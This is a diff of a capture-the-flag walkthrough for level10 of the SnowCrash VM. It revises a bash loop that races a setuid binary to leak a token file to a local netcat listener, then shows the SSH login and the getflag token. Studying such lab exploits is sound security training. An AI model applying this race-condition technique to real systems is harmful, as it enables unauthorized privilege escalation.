@@ -293,12 +293,12 @@ loop_linking                                                 100%  132   321.0KB
 ```shell-session
 #!/bin/bash
 
-set -eu
+set -xeu
 
-while [ $? -ne 0 ]; do
-  ~/./level10 /tmp/outward $1
+for i in {1..100};
+do
+  ( ~/./level10 /tmp/outward $1 & )
 done
-echo "EXECUTION LOOP DONE."
 ```
 
 4. Send it to the VM in `/tmp`
@@ -321,7 +321,7 @@ loop_execution                                               100%  108   340.1KB
 
 Terminal 2:
 
-5. In the VM, give rights to both scripts and both files
+5. In the VM, give rights to all files
 
 ```shell-session
 level10@SnowCrash:/tmp$ touch dummy
@@ -352,8 +352,19 @@ Terminal 2:
 
 ```shell-session
 level10@SnowCrash:/tmp$ ./loop_execution "127.0.0.1"
-Connecting to 127.0.0.1:6969 .. Connected!
++ for i in '{1..100}'
++ for i in '{1..100}'
++ for i in '{1..100}'
++ /home/user/level10/./level10 /tmp/outward 127.0.0.1
+You don't have access to /tmp/outward
+[...]
 Sending file .. wrote file!
++ /home/user/level10/./level10 /tmp/outward 127.0.0.1
+Connecting to 127.0.0.1:6969 .. + for i in '{1..100}'
+Connected!
+^C
+[...]
+
 ```
 
 Terminal 3 :
@@ -361,7 +372,27 @@ Terminal 3 :
 9. See the contents of `token` file. 
 ```shell-session
 level10@SnowCrash:~$ nc -lk 6969
-s5cAJpM8ev6XHw998pRWG728z.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
 ```
 
 ## getflag
+
+```shell-session
+ λ snowcrash42/level10/Ressources ssh flag10@192.168.1.28 -p 4242
+	   _____                      _____               _
+	  / ____|                    / ____|             | |
+	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
+	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
+	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+
+  Good luck & Have fun
+
+          192.168.1.28 2a01:cb08:18b:8b00:24ec:7e63:a9c2:6b92 2a01:cb08:18b:8b00:a00:27ff:fe7d:ef51
+flag10@192.168.1.28's password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$
+```
